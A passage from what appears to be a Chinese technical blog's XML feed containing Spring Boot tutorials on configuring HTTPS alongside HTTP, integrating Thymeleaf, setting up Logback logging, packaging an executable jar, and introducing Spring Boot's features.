        <content type="html"><![CDATA[<p>这里讲的是 Spring Boot 内嵌式 Server 打 jar 包运行的方式，打 WAR 包部署的就不存在要 Spring Boot 支持 HTTPS 了，需要去外部对应的 Server 配置。</p><h2 id="支持-HTTPS"><a href="#支持-HTTPS" class="headerlink" title="支持 HTTPS"></a>支持 HTTPS</h2><p>Spring Boot 配置 SSL 很简单，只需要通过一系列的 <code>server.ssl.*</code> 参数即可完成配置，如下所示。</p><p>application.properties 配置文件参考配置：</p><pre class="line-numbers language-none"><code class="language-none">server.port&#x3D;8443server.ssl.protocol&#x3D;TLSserver.ssl.key-store&#x3D;classpath:javastack.keystoreserver.ssl.key-store-password&#x3D;javastackserver.ssl.key-store-type&#x3D;JKS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这边只是提供了一个 SSL 单向验证的演示，更多 SSL 参数配置如下。</p><pre class="line-numbers language-none"><code class="language-none">server.ssl.ciphers&#x3D; # Supported SSL ciphers.server.ssl.client-auth&#x3D; # Whether client authentication is wanted (&quot;want&quot;) or needed (&quot;need&quot;). Requires a trust store.server.ssl.enabled&#x3D; # Enable SSL support.server.ssl.enabled-protocols&#x3D; # Enabled SSL protocols.server.ssl.key-alias&#x3D; # Alias that identifies the key in the key store.server.ssl.key-password&#x3D; # Password used to access the key in the key store.server.ssl.key-store&#x3D; # Path to the key store that holds the SSL certificate (typically a jks file).server.ssl.key-store-password&#x3D; # Password used to access the key store.server.ssl.key-store-provider&#x3D; # Provider for the key store.server.ssl.key-store-type&#x3D; # Type of the key store.server.ssl.protocol&#x3D;TLS # SSL protocol to use.server.ssl.trust-store&#x3D; # Trust store that holds SSL certificates.server.ssl.trust-store-password&#x3D; # Password used to access the trust store.server.ssl.trust-store-provider&#x3D; # Provider for the trust store.server.ssl.trust-store-type&#x3D; # Type of the trust store.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>参数对应的类：org.springframework.boot.web.server.Ssl</p></blockquote><p>上面的例子配置后就能开启 HTTPS 了，默认的 HTTP 协议就不再支持了，Spring Boot 不支持以配置文件配置的方式同时支持 HTTP 和 HTTPS。</p><h2 id="如何同时支持"><a href="#如何同时支持" class="headerlink" title="如何同时支持?"></a>如何同时支持?</h2><p>如果你需要同时支持 HTTP 和 HTTPS 这两个协议，就需要把另外一个协议用程序化的方式来配置。因为通过程序的方式配置 HTTP 协议更加简单一点，所以，Spring Boot 推荐的做法是把 HTTPS 配置在配置文件，HTTP 通过程序来配置。</p><p>来，下面示例就是通过程序的方式来额外支持 HTTP 协议。</p><pre class="line-numbers language-none"><code class="language-none">@SpringBootApplicationpublic class JavastackApplication &#123;@Beanpublic ServletWebServerFactory servletContainer() &#123;TomcatServletWebServerFactory tomcat &#x3D; new TomcatServletWebServerFactory();tomcat.addAdditionalTomcatConnectors(createStandardConnector());return tomcat;&#125;private Connector createStandardConnector() &#123;Connector connector &#x3D; new Connector(&quot;org.apache.coyote.http11.Http11NioProtocol&quot;);connector.setPort(8080);return connector;&#125;public static void main(String[] args) &#123;SpringApplication.run(JavastackApplication.class, args);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>启动 Spring Boot 之后就会看到下面的同时支持两个协议日志。</p><pre class="line-numbers language-none"><code class="language-none">Tomcat started on port(s): 8443 (https) 8080 (http) with context path &#39;&#x2F;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Spring Boot 支持 HTTPS 如此简单，开发现在把运维的事都做了……</p><p>在公众号后台回复：boot，还能获取栈长整理的往期 Spring Boot 教程，都是实战干货，以下仅为部分预览。</p><ul><li>Spring Boot 读取配置的几种方式</li><li>Spring Boot 如何做参数校验？</li><li>Spring Boot 最核心的 25 个注解！</li><li>Spring Boot 2.x 启动全过程源码分析</li><li>Spring Boot 2.x 新特性总结及迁移指南</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 整合Thymeleaf模板引擎</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%95%B4%E5%90%88Thymeleaf%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%95%B4%E5%90%88Thymeleaf%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Thymeleaf"><a href="#什么是Thymeleaf" class="headerlink" title="什么是Thymeleaf"></a>什么是Thymeleaf</h2><p>Thymeleaf是一款用于渲染XML、XHTML、HTML5内容的模板引擎。类似Velocity，FreeMaker模板引擎，它也可以轻易的与Spring MVC等Web框架进行集成作为Web应用的模板引擎。</p><p>Thymeleaf也是Spring Boot首要支持的模板引擎，并且在最新的Spring Boot版本中已经不再支持Velocity了。</p><blockquote><p>官网：<a href="http://www.thymeleaf.org/">http://www.thymeleaf.org/</a></p></blockquote><h2 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h2><p>需要引入Spring Boot的Thymeleaf启动器依赖。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>引入该依赖后会自动引入web依赖，不需要再单独引入web依赖。</p><h2 id="自动配置说明"><a href="#自动配置说明" class="headerlink" title="自动配置说明"></a>自动配置说明</h2><p>下面是Thymeleaf的自动配置相关类。</p><p>Thymeleaf的自动配置类：</p><blockquote><p>org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration</p></blockquote><p>Thymeleaf的自动配置参数类：</p><blockquote><p>org.springframework.boot.autoconfigure.thymeleaf.ThymeleafProperties</p></blockquote><p>查看参数源码：</p><pre class="line-numbers language-none"><code class="language-none">private static final Charset DEFAULT_ENCODING &#x3D; Charset.forName(&quot;UTF-8&quot;);private static final MimeType DEFAULT_CONTENT_TYPE &#x3D; MimeType.valueOf(&quot;text&#x2F;html&quot;);public static final String DEFAULT_PREFIX &#x3D; &quot;classpath:&#x2F;templates&#x2F;&quot;;public static final String DEFAULT_SUFFIX &#x3D; &quot;.html&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认的编码是：UTF-8</p><p>默认的类型是：text&#x2F;html</p><p>默认的模板文件目录是：classpath:&#x2F;templates&#x2F;</p><p>默认的模板文件后缀是：.html</p><p>这些参数都可以通过在application配置文件中指定<code>spring.thymeleaf.xx</code>进行更改，更多可参考该参数类。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>知道了自动配置的原理，所以我们可以知道怎么做了。</p><p>一、在resources目录下创建templates目录。</p><p>二、在templates目录下创建.html模板文件。</p><p>三、使用模板：</p><p>1、模板文件头部使用<code>&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;</code>定义。</p><p>2、html标签上使用<code>th:</code>开头标识作为前缀。</p><p>3、通过<code>@{}</code>引入web静态文件。</p><pre class="line-numbers language-none"><code class="language-none">&lt;link rel&#x3D;&quot;stylesheet&quot; th:href&#x3D;&quot;@&#123;&#x2F;css&#x2F;jquery.min.css&#125;&quot;&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4、访问数据</p><p>访问springmvc中的model数据：<code>${user.name}</code>，访问更多不同对象的数据请<a href="http://www.thymeleaf.org/doc/articles/springmvcaccessdata.html">点击</a>参考官方定义。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 日志集成</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%97%A5%E5%BF%97%E9%9B%86%E6%88%90/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%97%A5%E5%BF%97%E9%9B%86%E6%88%90/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-Boot日志框架"><a href="#Spring-Boot日志框架" class="headerlink" title="Spring Boot日志框架"></a>Spring Boot日志框架</h2><p>Spring Boot支持Java Util Logging,Log4j2,Lockback作为日志框架，如果你使用starters启动器，Spring Boot将使用Logback作为默认日志框架。无论使用哪种日志框架，Spring Boot都支持配置将日志输出到控制台或者文件中。</p><p>spring-boot-starter启动器包含spring-boot-starter-logging启动器并集成了slf4j日志抽象及Logback日志框架。</p><h2 id="属性配置日志"><a href="#属性配置日志" class="headerlink" title="属性配置日志"></a>属性配置日志</h2><p>Spring Boot支持属性配置日志参数，这个不是很灵活，不细讲。</p><p>参考配置：</p><pre class="line-numbers language-none"><code class="language-none"># LOGGINGlogging.config&#x3D; # Location of the logging configuration file. For instance &#96;classpath:logback.xml&#96; for Logbacklogging.exception-conversion-word&#x3D;%wEx # Conversion word used when logging exceptions.logging.file&#x3D; # Log file name. For instance &#96;myapp.log&#96;logging.level.*&#x3D; # Log levels severity mapping. For instance &#96;logging.level.org.springframework&#x3D;DEBUG&#96;logging.path&#x3D; # Location of the log file. For instance &#96;&#x2F;var&#x2F;log&#96;logging.pattern.console&#x3D; # Appender pattern for output to the console. Only supported with the default logback setup.logging.pattern.file&#x3D; # Appender pattern for output to the file. Only supported with the default logback setup.logging.pattern.level&#x3D; # Appender pattern for log level (default %5p). Only supported with the default logback setup.logging.register-shutdown-hook&#x3D;false # Register a shutdown hook for the logging system when it is initialized.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如：</p><pre class="line-numbers language-none"><code class="language-none">logging.level.root&#x3D;DEBUGlogging.level.org.springframework.web&#x3D;DEBUGlogging.level.org.hibernate&#x3D;ERROR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="自定义日志文件"><a href="#自定义日志文件" class="headerlink" title="自定义日志文件"></a>自定义日志文件</h2><p>根据不同的日志框架，默认加载的日志配置文件的文件名，放在资源根目录下，其他的目录及文件名不能被加载。</p><table><thead><tr><th>Logging System</th><th>Customization</th></tr></thead><tbody><tr><td>Logback</td><td>logback-spring.xml, logback-spring.groovy, logback.xml or logback.groovy</td></tr><tr><td>Log4j2</td><td>log4j2-spring.xml or log4j2.xml</td></tr><tr><td>JDK (Java Util Logging)</td><td>logging.properties</td></tr></tbody></table><p>既然默认自带了Logback框架，Logback也是最优秀的日志框架，往资源目录下创建一个logback-spring.xml即可，下面是一个参考配置文件。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;configuration debug&#x3D;&quot;false&quot;&gt;&lt;springProperty scope&#x3D;&quot;context&quot; name&#x3D;&quot;APP_NAME&quot; source&#x3D;&quot;spring.application.name&quot;&#x2F;&gt;&lt;springProperty scope&#x3D;&quot;context&quot; name&#x3D;&quot;APP_PORT&quot; source&#x3D;&quot;server.port&quot;&#x2F;&gt;&lt;springProperty scope&#x3D;&quot;context&quot; name&#x3D;&quot;DEFAULT_APP_PORT&quot; source&#x3D;&quot;spring.application.port&quot;&#x2F;&gt;&lt;property name&#x3D;&quot;OS_NAME&quot; value&#x3D;&quot;$&#123;os.name&#125;&quot;&#x2F;&gt;&lt;if condition&#x3D;&#39;property(&quot;OS_NAME&quot;).contains(&quot;Windows&quot;)&#39;&gt;&lt;then&gt;&lt;property name&#x3D;&quot;LOG_PATH&quot; value&#x3D;&quot;$&#123;LOG_PATH:-E:&#x2F;logs&#125;&quot; &#x2F;&gt;&lt;&#x2F;then&gt;&lt;else&gt;&lt;property name&#x3D;&quot;LOG_PATH&quot; value&#x3D;&quot;$&#123;LOG_PATH:-&#x2F;log&#125;&quot; &#x2F;&gt;&lt;&#x2F;else&gt;&lt;&#x2F;if&gt;        &lt;property name&#x3D;&quot;LOG_DIR&quot; value&#x3D;&quot;$&#123;APP_NAME:-system&#125;&quot; &#x2F;&gt;&lt;property name&#x3D;&quot;APP_PORT&quot; value&#x3D;&quot;$&#123;APP_PORT:-$&#123;DEFAULT_APP_PORT:-0&#125;&#125;&quot; &#x2F;&gt;&lt;if condition&#x3D;&#39;!property(&quot;APP_PORT&quot;).equals(&quot;0&quot;)&#39;&gt;&lt;then&gt;&lt;property name&#x3D;&quot;LOG_DIR&quot; value&#x3D;&quot;$&#123;LOG_DIR&#125;-$&#123;APP_PORT&#125;&quot; &#x2F;&gt;&lt;&#x2F;then&gt;&lt;&#x2F;if&gt;<!-- 控制台输出 -->&lt;appender name&#x3D;&quot;STDOUT&quot; class&#x3D;&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt;&lt;encoder class&#x3D;&quot;ch.qos.logback.classic.encoder.PatternLayoutEncoder&quot;&gt;<!--格式化输出：%d表示日期，%thread表示线程名，%-5level：级别从左显示5个字符宽度，%msg：日志消息，%n是换行符 -->&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n&lt;&#x2F;pattern&gt;&lt;&#x2F;encoder&gt;&lt;&#x2F;appender&gt;<!-- 按照每天生成日志文件 -->&lt;appender name&#x3D;&quot;FILE&quot; class&#x3D;&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;&lt;filter class&#x3D;&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;&lt;level&gt;INFO&lt;&#x2F;level&gt;&lt;&#x2F;filter&gt;&lt;rollingPolicy class&#x3D;&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;<!--日志文件输出的文件名 -->&lt;FileNamePattern&gt;$&#123;LOG_PATH&#125;&#x2F;$&#123;LOG_DIR&#125;&#x2F;info.log.%d&#123;yyyy-MM-dd&#125;.log&lt;&#x2F;FileNamePattern&gt;<!--日志文件保留天数 -->&lt;MaxHistory&gt;30&lt;&#x2F;MaxHistory&gt;&lt;&#x2F;rollingPolicy&gt;&lt;encoder class&#x3D;&quot;ch.qos.logback.classic.encoder.PatternLayoutEncoder&quot;&gt;<!--格式化输出：%d表示日期，%thread表示线程名，%-5level：级别从左显示5个字符宽度%msg：日志消息，%n是换行符 -->&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n&lt;&#x2F;pattern&gt;&lt;&#x2F;encoder&gt;<!--日志文件最大的大小 -->&lt;triggeringPolicy class&#x3D;&quot;ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy&quot;&gt;&lt;MaxFileSize&gt;10MB&lt;&#x2F;MaxFileSize&gt;&lt;&#x2F;triggeringPolicy&gt;&lt;&#x2F;appender&gt;<!-- 按照每天生成日志文件 error级别 -->&lt;appender name&#x3D;&quot;FILE-ERROR&quot; class&#x3D;&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;&lt;filter class&#x3D;&quot;ch.qos.logback.classic.filter.LevelFilter&quot;&gt;&lt;level&gt;ERROR&lt;&#x2F;level&gt;&lt;onMatch&gt;ACCEPT&lt;&#x2F;onMatch&gt;&lt;onMismatch&gt;DENY&lt;&#x2F;onMismatch&gt;&lt;&#x2F;filter&gt;   &lt;rollingPolicy class&#x3D;&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;<!--日志文件输出的文件名 -->&lt;FileNamePattern&gt;$&#123;LOG_PATH&#125;&#x2F;$&#123;LOG_DIR&#125;&#x2F;error.log.%d&#123;yyyy-MM-dd&#125;.log&lt;&#x2F;FileNamePattern&gt;<!--日志文件保留天数 -->&lt;MaxHistory&gt;30&lt;&#x2F;MaxHistory&gt;&lt;&#x2F;rollingPolicy&gt;&lt;encoder class&#x3D;&quot;ch.qos.logback.classic.encoder.PatternLayoutEncoder&quot;&gt;<!--格式化输出：%d表示日期，%thread表示线程名，%-5level：级别从左显示5个字符宽度%msg：日志消息，%n是换行符 -->&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n&lt;&#x2F;pattern&gt;&lt;&#x2F;encoder&gt;<!--日志文件最大的大小 -->&lt;triggeringPolicy class&#x3D;&quot;ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy&quot;&gt;&lt;MaxFileSize&gt;10MB&lt;&#x2F;MaxFileSize&gt;&lt;&#x2F;triggeringPolicy&gt;&lt;&#x2F;appender&gt;<!--myibatis log configure -->&lt;logger name&#x3D;&quot;com.apache.ibatis&quot; level&#x3D;&quot;TRACE&quot; &#x2F;&gt;&lt;logger name&#x3D;&quot;java.sql.Connection&quot; level&#x3D;&quot;DEBUG&quot; &#x2F;&gt;&lt;logger name&#x3D;&quot;java.sql.Statement&quot; level&#x3D;&quot;DEBUG&quot; &#x2F;&gt;&lt;logger name&#x3D;&quot;java.sql.PreparedStatement&quot; level&#x3D;&quot;DEBUG&quot; &#x2F;&gt;<!-- 日志输出级别 -->&lt;root level&#x3D;&quot;INFO&quot;&gt;&lt;appender-ref ref&#x3D;&quot;STDOUT&quot; &#x2F;&gt;&lt;appender-ref ref&#x3D;&quot;FILE&quot; &#x2F;&gt;&lt;appender-ref ref&#x3D;&quot;FILE-ERROR&quot; &#x2F;&gt;&lt;&#x2F;root&gt;&lt;&#x2F;configuration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>强烈推荐使用logback-spring.xml作为文件名，因为logback.xml加载太早。</p><p>日志初始化在ApplicationContext创建之前，所以@PropertySources加载的配置是读取不到的，系统环境变量、Spring Environment及application,bootstrap配置文件中的信息可以读取到。</p><p>读取系统环境属性：</p><pre class="line-numbers language-none"><code class="language-none">&lt;property name&#x3D;&quot;LOG_PATH&quot; value&#x3D;&quot;$&#123;LOG_PATH:-E:&#x2F;logs&#125;&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>读取当前应用Environment中的属性：</p><pre class="line-numbers language-none"><code class="language-none">&lt;springProperty scope&#x3D;&quot;context&quot; name&#x3D;&quot;fluentHost&quot; source&#x3D;&quot;myapp.fluentd.host&quot;        defaultValue&#x3D;&quot;localhost&quot;&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Spring Boot也支持通过springProfile来加载不同profiles下的配置。</p><pre class="line-numbers language-none"><code class="language-none">&lt;springProfile name&#x3D;&quot;staging&quot;&gt;    <!-- configuration to be enabled when the "staging" profile is active -->&lt;&#x2F;springProfile&gt;&lt;springProfile name&#x3D;&quot;dev, staging&quot;&gt;    <!-- configuration to be enabled when the "dev" or "staging" profiles are active -->&lt;&#x2F;springProfile&gt;&lt;springProfile name&#x3D;&quot;!production&quot;&gt;    <!-- configuration to be enabled when the "production" profile is not active -->&lt;&#x2F;springProfile&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 怎么打一个可执行 Jar 包</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%80%8E%E4%B9%88%E6%89%93%E4%B8%80%E4%B8%AA%E5%8F%AF%E6%89%A7%E8%A1%8C%20Jar%20%E5%8C%85/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%80%8E%E4%B9%88%E6%89%93%E4%B8%80%E4%B8%AA%E5%8F%AF%E6%89%A7%E8%A1%8C%20Jar%20%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p>传统的 Java 应用程序都需要打一个 war 包，并到到 Tomcat webapps 目录下运行。</p><p>Java 支持打 Jar 包，但没有提供一个标准的方式在一个 Jar 包内再加载嵌入别的 Jar 包，一般需要扩展类加载器来实现，即使这样，也做不到打成一个包运行，因为没有 Servlet 容器。</p><p>有了 Spring Boot 框架之后，这一切都变得简单，我们可以很方便的将应用程序打成一个可执行 Jar 包。</p><h2 id="怎么打成-Jar-包运行？"><a href="#怎么打成-Jar-包运行？" class="headerlink" title="怎么打成 Jar 包运行？"></a>怎么打成 Jar 包运行？</h2><h4 id="1、添加插件"><a href="#1、添加插件" class="headerlink" title="1、添加插件"></a>1、添加插件</h4><pre class="line-numbers language-none"><code class="language-none">&lt;plugin&gt;    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;spring-boot-maven-plugin&lt;&#x2F;artifactId&gt;    &lt;executions&gt;        &lt;execution&gt;            &lt;goals&gt;                &lt;goal&gt;repackage&lt;&#x2F;goal&gt;            &lt;&#x2F;goals&gt;            &lt;configuration&gt;                &lt;classifier&gt;exec-$&#123;env&#125;&lt;&#x2F;classifier&gt;            &lt;&#x2F;configuration&gt;        &lt;&#x2F;execution&gt;    &lt;&#x2F;executions&gt;&lt;&#x2F;plugin&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里是添加了一个 Maven 打包插件，通过配置可以定制打成的 Jar 包的格式，如：javastack-exec-dev.jar。</p><p>如果你是用的 spring-boot-starter-parent 方式来使用 Spring Boot，那就不用写 executions 选项，因为它包括了 executions repackage 构建配置。</p><p>这个插件的更多用法参考：</p><blockquote><p><a href="https://docs.spring.io/spring-boot/docs/2.1.3.RELEASE/maven-plugin/usage.html">https://docs.spring.io/spring-boot/docs/2.1.3.RELEASE/maven-plugin/usage.html</a></p></blockquote><h4 id="2、打成-Jar-包"><a href="#2、打成-Jar-包" class="headerlink" title="2、打成 Jar 包"></a>2、打成 Jar 包</h4><p>使用 mvn package 命令或者 IDE 中的 Maven 插件都可以打包。<br>打完包之后，在项目 target 目录就可以看到打成的 Jar 包。</p><p>这个 Jar 包除了包括编译完的 class 文件，还内置了 Servlet 容器，并集成了所有需要依赖的其他 Jar 包库，我们来看下这个 Jar 包的目录结构。</p><pre class="line-numbers language-none"><code class="language-none">├─BOOT-INF│  ├─classes│  │  └─cn│  │      └─javastack│  │          └─demo│  └─lib├─META-INF│  └─maven│      └─cn.javastack│          └─demo└─org    └─springframework        └─boot            └─loader                ├─archive                ├─data                ├─jar                └─util<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在文件 \META-INF\MANIFEST.MF 中找到应用程序启动类：</p><pre class="line-numbers language-none"><code class="language-none">Manifest-Version: 1.0Archiver-Version: Plexus ArchiverBuilt-By: javastackStart-Class: cn.javastack.demo.ApplicationSpring-Boot-Classes: BOOT-INF&#x2F;classes&#x2F;Spring-Boot-Lib: BOOT-INF&#x2F;lib&#x2F;Spring-Boot-Version: 2.1.3.RELEASECreated-By: Apache Maven 3.5.0Build-Jdk: 1.8.0_151Main-Class: org.springframework.boot.loader.JarLauncher<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、运行-Jar-包"><a href="#3、运行-Jar-包" class="headerlink" title="3、运行 Jar 包"></a>3、运行 Jar 包</h4><p>运行命令格式：</p><blockquote><p>$ java -jar xxx.jar</p></blockquote><p>运行命令演示：</p><blockquote><p>$ java -jar javastack-exec-dev.jar</p></blockquote><pre class="line-numbers language-none"><code class="language-none">.   ____          _            __ _ _ &#x2F;\\ &#x2F; ___&#39;_ __ _ _(_)_ __  __ _ \ \ \ \( ( )\___ | &#39;_ | &#39;_| | &#39;_ \&#x2F; _&#96; | \ \ \ \ \\&#x2F;  ___)| |_)| | | | | || (_| |  ) ) ) )  &#39;  |____| .__|_| |_|_| |_\__, | &#x2F; &#x2F; &#x2F; &#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|_|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|___&#x2F;&#x3D;&#x2F;_&#x2F;_&#x2F;_&#x2F; :: Spring Boot ::  (v2.1.3.RELEASE)....... . . ........ . . . (log output here)....... . . ......... Started Example in 2.536 seconds (JVM running for 2.864)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在公众号后台回复：boot，还能获取栈长整理的往期 Spring Boot 教程，都是实战干货，以下仅为部分预览。</p><ul><li>Spring Boot 读取配置的几种方式</li><li>Spring Boot 如何做参数校验？</li><li>Spring Boot 最核心的 25 个注解！</li><li>Spring Boot 2.x 启动全过程源码分析</li><li>Spring Boot 2.x 新特性总结及迁移指南</li></ul><p><img src="http://img.javastack.cn/wx_search_javastack.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 是什么？</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Spring-Boot"><a href="#什么是Spring-Boot" class="headerlink" title="什么是Spring Boot?"></a>什么是Spring Boot?</h2><p>Spring Boot是Spring开源组织下的子项目，是Spring组件一站式解决方案，主要是简化了使用Spring的难度，简省了繁重的配置，提供了各种启动器，开发者能快速上手。</p><p>官方网站：<a href="http://projects.spring.io/spring-boot//">http://projects.spring.io/spring-boot/\</a><br>GitHub源码：<a href="https://github.com/spring-projects/spring-boot">https://github.com/spring-projects/spring-boot</a></p><h2 id="Spring-Boot的优点"><a href="#Spring-Boot的优点" class="headerlink" title="Spring Boot的优点"></a>Spring Boot的优点</h2><p>Features</p><blockquote><ul><li>Create stand-alone Spring applications</li><li>Embed Tomcat, Jetty or Undertow directly (no need to deploy WAR files)</li><li>Provide opinionated ‘starter’ POMs to simplify your Maven configuration</li><li>Automatically configure Spring whenever possible</li><li>Provide production-ready features such as metrics, health checks and externalized configuration</li><li>Absolutely no code generation and no requirement for XML configuration</li></ul></blockquote><ul><li><p>独立运行</p><p>  Spring Boot而且内嵌了各种servlet容器，Tomcat、Jetty等，现在不再需要打成war包部署到容器中，Spring Boot只要打成一个可执行的jar包就能独立运行，所有的依赖包都在一个jar包内。</p></li><li><p>简化配置</p><p> spring-boot-starter-web启动器自动依赖其他组件，简少了maven的配置。</p></li></ul><pre class="line-numbers language-none"><code class="language-none">+- org.springframework.boot:spring-boot-starter-web:jar:1.5.6.RELEASE:compile+- org.springframework.boot:spring-boot-starter-tomcat:jar:1.5.6.RELEASE:compile|  +- org.apache.tomcat.embed:tomcat-embed-core:jar:8.5.16:compile|  +- org.apache.tomcat.embed:tomcat-embed-el:jar:8.5.16:compile|  \- org.apache.tomcat.embed:tomcat-embed-websocket:jar:8.5.16:compile+- org.hibernate:hibernate-validator:jar:5.3.5.Final:compile|  +- javax.validation:validation-api:jar:1.1.0.Final:compile|  +- org.jboss.logging:jboss-logging:jar:3.3.1.Final:compile|  \- com.fasterxml:classmate:jar:1.3.3:compile\- org.springframework:spring-webmvc:jar:4.3.10.RELEASE:compile<span aria-hidden="true" 